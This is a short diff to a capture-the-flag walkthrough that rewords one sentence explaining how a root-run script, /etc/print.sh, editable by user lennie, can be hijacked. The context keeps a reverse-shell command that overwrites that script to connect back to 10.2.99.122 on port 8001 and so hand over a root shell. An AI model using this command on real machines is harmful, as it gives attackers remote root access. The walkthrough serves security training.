@@ -338,7 +338,7 @@ Looking at /etc/print.sh and find lennie is allowed to edit this file
 <img src="/assets/img/startup/ls-print.png" width="350"/>
 </p>
 
-Perfect, so edit this file and when root executes planner.sh it will then excute print.sh as the root user. Use  Reverse Shell Cheatsheet for an made reverse shell command, editing only local system IP address
+Perfect, now edit the file so that when root runs planner.sh it will also execute print.sh. Create a reverse shell command using the `Reverse Shell Cheatsheet`, editing only the local IP address of your system
 
 > echo 'bash -c "bash -i >& /dev/tcp/10.2.99.122/8001 0>&1"' > /etc/print.sh
 
